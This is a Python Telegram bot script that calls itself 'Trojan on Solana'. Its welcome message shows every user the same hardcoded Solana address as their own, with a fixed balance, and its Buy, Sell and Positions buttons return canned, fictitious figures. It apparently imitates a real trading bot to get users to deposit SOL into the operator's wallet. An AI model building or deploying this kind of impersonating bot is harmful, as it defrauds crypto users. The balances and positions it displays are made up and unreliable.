import os
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Set up logging to monitor errors and debug information
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Load required environment variables
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")  # Fetch the bot token from the environment
PORT = int(os.getenv("PORT", "8443"))  # Render sets the PORT environment variable
HOSTNAME = os.getenv("RENDER_EXTERNAL_HOSTNAME")  # Render sets this for webhook configuration

if not TOKEN:
    raise ValueError("Telegram bot token is not set. Please ensure the TELEGRAM_BOT_TOKEN environment variable is configured.")

# Define the admin Telegram user ID
ADMIN_ID = int(os.getenv("ADMIN_ID", "5698476270"))  # Replace with your ID or set via environment

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Buy", callback_data="buy"),
            InlineKeyboardButton("Sell", callback_data="sell"),
        ],
        [
            InlineKeyboardButton("Positions", callback_data="positions"),
            InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
        ],
        [
            InlineKeyboardButton("Referrals", callback_data="referrals"),
            InlineKeyboardButton("Withdraw", callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
            InlineKeyboardButton("Settings", callback_data="settings"),
        ],
        [
            InlineKeyboardButton("Admin Page", callback_data="admin_page"),
            InlineKeyboardButton("Help", callback_data="help"),
        ],
    ])

# Define the /start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_message = (
        f"Welcome to Trojan on Solana, {update.message.from_user.first_name}!\n\n"
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "Solana Address:\n\n"
        "CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat\n"
        "(tap to copy)\n\n"
        "Balance: (2.419) SOL\n\n"
        "Join our Telegram group @trojan for updates and community support!"
    )
    await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())

# Function to handle button presses
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    if query.data == "admin_page":
        if user_id == ADMIN_ID:
            admin_message = "Welcome to the Admin Page. Manage bot settings and monitor activities here."
            await query.edit_message_text(admin_message, reply_markup=main_menu_keyboard())
        else:
            logger.warning(f"Unauthorized admin page access attempt by user ID {user_id}.")
            await query.answer("You are not authorized to access this page!", show_alert=True)
            return
    elif query.data == "buy":
        await query.edit_message_text(
            "Buy $SLND- (Solend) 📈\n\nBalance: -_- SOL\nInsufficient balance for buy amount + gas.",
            reply_markup=main_menu_keyboard()
        )
    elif query.data == "sell":
        await query.edit_message_text(
            "Sell $SLND- (Solend) 📉\n\nBalance: 2.419 SOL\nReady to sell? Confirm the amount.",
            reply_markup=main_menu_keyboard()
        )
    elif query.data == "positions":
        await query.edit_message_text(
            "Current Positions 📊\n\n1. Position 1: $100\n2. Position 2: $200\nTotal: $300",
            reply_markup=main_menu_keyboard()
        )
    elif query.data == "help":
        await query.edit_message_text(
            "Need Help? Contact support or join @trojan for updates.",
            reply_markup=main_menu_keyboard()
        )
    else:
        await query.edit_message_text("Feature not implemented yet.", reply_markup=main_menu_keyboard())

# Function to start the bot
def run_bot():
    application = Application.builder().token(TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))

    # Run the bot using a webhook
    application.run_webhook(
        listen="0.0.0.0",  # Bind to all network interfaces
        port=PORT,  # Use the port from Render
        url_path=TOKEN,  # URL path for Telegram
        webhook_url=f"https://{HOSTNAME}/{TOKEN}"  # Full webhook URL
    )

# Entry point of the script
if __name__ == "__main__":
    run_bot()
